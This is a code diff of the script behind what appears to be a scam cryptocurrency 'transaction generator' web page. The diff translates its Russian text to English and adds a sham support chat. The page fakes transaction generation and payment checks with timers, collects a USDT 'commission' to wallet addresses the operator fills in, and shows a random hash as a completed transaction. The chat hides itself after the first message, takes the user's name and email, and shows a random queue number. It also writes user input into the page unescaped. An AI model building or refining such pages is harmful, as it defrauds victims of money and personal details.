+        function closeSupport() {
+            document.getElementById('chatOverlay').classList.remove('active');
+            // Reset chat state
+            document.getElementById('chatMessages').style.display = 'block';
+            document.getElementById('chatInputArea').style.display = 'block';
+            document.getElementById('contactForm').classList.remove('active');
+            document.getElementById('queueScreen').classList.remove('active');
+        }
+
+        function sendMessage() {
+            const input = document.getElementById('chatInput');
+            const message = input.value.trim();
+            
+            if (!message) return;
+
+            // Add user message
+            const messagesContainer = document.getElementById('chatMessages');
+            const userMsg = document.createElement('div');
+            userMsg.className = 'message user';
+            userMsg.innerHTML = `
+                <div class="message-bubble">${message}</div>
+                <div class="message-time">Just now</div>
+            `;
+            messagesContainer.appendChild(userMsg);
+            messagesContainer.scrollTop = messagesContainer.scrollHeight;
+            
+            input.value = '';
+
+            // Show contact form after first message
+            setTimeout(() => {
+                document.getElementById('chatMessages').style.display = 'none';
+                document.getElementById('chatInputArea').style.display = 'none';
+                document.getElementById('contactForm').classList.add('active');
+            }, 1000);
+        }
+
+        function submitContactInfo() {
+            const name = document.getElementById('supportName').value;
+            const email = document.getElementById('supportEmail').value;
+            
+            if (!name || !email) {
+                alert('Please fill in required fields');
+                return;
+            }
+
+            // Hide form, show queue
+            document.getElementById('contactForm').classList.remove('active');
+            document.getElementById('queueScreen').classList.add('active');
+            
+            // Random queue number between 20-200
+            const queueNum = Math.floor(Math.random() * (200 - 20 + 1)) + 20;
+            document.getElementById('queueNumber').textContent = queueNum;
+        }
+
         // Commission calculation
         function calculateCommission(amount) {
             if (amount >= 100000) return 200;
             if (amount >= 50000) return 120;
             if (amount >= 20000) return 80;
             if (amount >= 10000) return 50;
-            return 50; // default
+            return 50;
         }
 
-        // Update commission display
         function updateCommission() {
             const amount = parseFloat(document.getElementById('amountInput').value) || 0;
             const commission = calculateCommission(amount);
@@ -1248,16 +1989,13 @@
             currentAmount = amount;
         }
 
-        // Set amount from quick buttons
         function setAmount(amount) {
             document.getElementById('amountInput').value = amount;
             updateCommission();
         }
 
-        // Amount input change listener
         document.getElementById('amountInput').addEventListener('input', updateCommission);
 
-        // Connect Wallet Function
         async function connectWallet() {
             const connectBtn = document.getElementById('connectBtn');
             const disconnectBtn = document.getElementById('disconnectBtn');
@@ -1271,36 +2009,33 @@
                     
                     walletAddressEl.textContent = userAddress.substring(0, 6) + '...' + userAddress.substring(userAddress.length - 4);
                     connectBtn.classList.add('connected');
-                    connectBtn.innerHTML = '✓ Кошелек подключен';
+                    connectBtn.innerHTML = translations[currentLang]['connected'];
                     disconnectBtn.style.display = 'block';
                 } catch (error) {
                     console.error('User rejected connection:', error);
-                    alert('Подключение отклонено пользователем');
+                    alert('Connection rejected by user');
                 }
             } else {
-                // Fallback for demo
                 userAddress = '0x' + Math.random().toString(16).substring(2, 42);
                 isWalletConnected = true;
                 
                 walletAddressEl.textContent = userAddress.substring(0, 6) + '...' + userAddress.substring(userAddress.length - 4);
                 connectBtn.classList.add('connected');
-                connectBtn.innerHTML = '✓ Кошелек подключен';
+                connectBtn.innerHTML = translations[currentLang]['connected'];
                 disconnectBtn.style.display = 'block';
             }
         }
 
-        // Disconnect Wallet
         function disconnectWallet() {
             isWalletConnected = false;
             userAddress = '';
             
-            document.getElementById('walletAddress').textContent = 'Не подключен';
+            document.getElementById('walletAddress').textContent = translations[currentLang]['not_connected'];
             document.getElementById('connectBtn').classList.remove('connected');
-            document.getElementById('connectBtn').innerHTML = '🔗 Подключить кошелек';
+            document.getElementById('connectBtn').innerHTML = translations[currentLang]['connect_wallet'];
             document.getElementById('disconnectBtn').style.display = 'none';
         }
 
-        // Form Submission
         document.getElementById('generatorForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -1309,37 +2044,30 @@
             const network = document.getElementById('network').value;
             const duration = document.getElementById('duration').value;
 
-            // Validation
             if (!amount || amount <= 0) {
-                alert('Пожалуйста, введите корректную сумму');
+                alert('Please enter a valid amount');
                 return;
             }
 
             if (!recipient || recipient.trim() === '') {
-                alert('Пожалуйста, укажите адрес получателя');
+                alert('Please specify recipient address');
                 return;
             }
 
-            // Save current values
             currentAmount = amount;
             currentNetwork = network;
             currentDuration = duration;
             currentRecipient = recipient;
 
-            // Show loading
             document.getElementById('loading').classList.add('active');
             document.getElementById('resultSection').classList.remove('active');
 
-            // Simulate transaction generation (3 seconds)
             setTimeout(() => {
                 document.getElementById('loading').classList.remove('active');
-                
-                // Show fee modal
                 showFeeModal();
             }, 3000);
         });
 
-        // Show Fee Modal
         function showFeeModal() {
             const commission = calculateCommission(currentAmount);
             const networkSelect = document.getElementById('network');
@@ -1349,8 +2077,7 @@
             document.getElementById('modalNetwork').textContent = networkText;
             document.getElementById('modalFee').textContent = commission + ' USDT';
             
-            // ВАЖНО: Здесь установите ваши кошельки в зависимости от сети
-            // Пример разных адресов для разных сетей:
+            // SET YOUR WALLET ADDRESSES HERE FOR DIFFERENT NETWORKS
             let walletAddress = '';
             switch(currentNetwork) {
                 case 'ethereum':
@@ -1373,7 +2100,6 @@
             document.getElementById('feeModal').classList.add('active');
         }
 
-        // Copy Address
         function copyAddress() {
             const addressInput = document.getElementById('paymentAddress');
             addressInput.select();
@@ -1381,32 +2107,24 @@
             
             const btn = event.target;
             const originalText = btn.textContent;
-            btn.textContent = '✓ Скопировано!';
+            btn.textContent = '✓ Copied!';
             setTimeout(() => {
                 btn.textContent = originalText;
             }, 2000);
         }
 
-        // Confirm Payment
         function confirmPayment() {
-            // Close modal
             document.getElementById('feeModal').classList.remove('active');
-            
-            // Show loading again
             document.getElementById('loading').classList.add('active');
-            document.getElementById('loading').querySelector('.loading-text').textContent = 'Ожидание подтверждения оплаты...';
+            document.getElementById('loading').querySelector('.loading-text').textContent = translations[currentLang]['awaiting_payment'];
             
-            // Simulate payment verification (5 seconds)
             setTimeout(() => {
                 document.getElementById('loading').classList.remove('active');
-                document.getElementById('loading').querySelector('.loading-text').textContent = 'Генерация транзакции...';
-                
-                // Show success result
+                document.getElementById('loading').querySelector('.loading-text').textContent = translations[currentLang]['generating'];
                 showSuccess();
             }, 5000);
         }
 
-        // Show Success
         function showSuccess() {
             const txHash = '0x' + Array.from({length: 64}, () => 
                 Math.floor(Math.random() * 16).toString(16)).join('');
@@ -1424,12 +2142,12 @@
             document.getElementById('txNetwork').textContent = networkText;
             document.getElementById('txDuration').textContent = durationText;
             
-            // Scroll to result
             document.getElementById('resultSection').scrollIntoView({ behavior: 'smooth', block: 'center' });
         }
 
         // Initialize
         updateCommission();
+        changeLanguage('en');
     </script>
 </body>
 </html>
